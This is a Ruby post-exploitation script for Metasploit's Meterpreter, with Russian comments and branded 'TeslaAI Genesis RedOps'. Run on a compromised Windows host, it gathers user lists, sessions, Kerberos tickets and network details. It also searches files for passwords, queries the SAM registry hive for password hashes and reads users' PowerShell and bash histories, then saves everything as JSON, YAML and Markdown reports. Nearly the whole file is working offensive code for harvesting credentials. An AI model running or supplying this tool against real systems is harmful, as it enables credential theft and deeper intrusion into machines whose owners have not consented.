#!/usr/bin/env ruby
#
# TeslaAI Genesis RedOps :: Report Extractor for Metasploit
# Автоматический сбор результатов пост-эксплуатации и генерация отчётов
# Работает с JSON, HTML, Markdown, YAML
#

require 'json'
require 'yaml'
require 'time'
require 'socket'
require 'rex/post/meterpreter/ui/console/command_dispatcher/stdapi'
require 'msf/core'

module ReportExtractor
  class Extractor
    def initialize(client, options = {})
      @client = client
      @report = {
        timestamp: Time.now.utc.iso8601,
        host: get_hostname,
        os: get_os_info,
        users: get_users,
        sessions: get_sessions,
        passwords: get_passwords,
        tickets: get_kerberos_tickets,
        hashes: get_hashes,
        shell_history: get_history,
        running_processes: get_processes,
        network_info: get_network_info
      }
      @output_dir = options[:output_dir] || "/tmp/reports/"
      Dir.mkdir(@output_dir) unless Dir.exist?(@output_dir)
    end

    def get_hostname
      @client.sys.config.sysinfo['Computer']
    rescue
      "unknown"
    end

    def get_os_info
      @client.sys.config.sysinfo
    rescue
      {}
    end

    def get_users
      @client.shell_command_token("net user")
    rescue
      "unavailable"
    end

    def get_sessions
      @client.shell_command_token("qwinsta")
    rescue
      "unavailable"
    end

    def get_passwords
      @client.shell_command_token("dir %TEMP%\\*creds* /s /b") +
      @client.shell_command_token("findstr /si password *.txt *.xml *.ini")
    rescue
      "unavailable"
    end

    def get_kerberos_tickets
      @client.shell_command_token("klist")
    rescue
      "unavailable"
    end

    def get_hashes
      @client.shell_command_token("reg query HKLM\\SAM /s") rescue "no access"
    end

    def get_history
      paths = [
        "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt",
        "C:\\Users\\*\\.bash_history"
      ]
      results = paths.map { |p| @client.shell_command_token("type #{p}") rescue nil }.compact
      results.empty? ? "not found" : results.join("\n")
    end

    def get_processes
      @client.sys.process.get_processes.map { |p| "#{p['pid']} #{p['name']}" }
    rescue
      []
    end

    def get_network_info
      @client.shell_command_token("ipconfig /all") +
      @client.shell_command_token("arp -a") +
      @client.shell_command_token("netstat -anob")
    rescue
      "unavailable"
    end

    def save_report
      timestamp = Time.now.strftime("%Y%m%d_%H%M%S")
      base_name = File.join(@output_dir, "autopwn_report_#{@report[:host]}_#{timestamp}")

      File.write("#{base_name}.json", JSON.pretty_generate(@report))
      File.write("#{base_name}.yaml", @report.to_yaml)
      File.write("#{base_name}.md", markdown_report)
    end

    def markdown_report
      out = "# Post-Exploitation Report for #{@report[:host]}\n\n"
      @report.each do |key, value|
        out += "## #{key.to_s.capitalize}\n"
        out += "```\n#{value}\n```\n\n"
      end
      out
    end
  end
end

# === Инициализация при вызове из консоли Metasploit ===
if __FILE__ == $0 && ::Msf::Client
  begin
    session = client
    extractor = ReportExtractor::Extractor.new(session, output_dir: "/tmp/reports")
    extractor.save_report
    print_good "Отчёт успешно сохранён."
  rescue => e
    print_error "Ошибка создания отчёта: #{e.message}"
  end
end
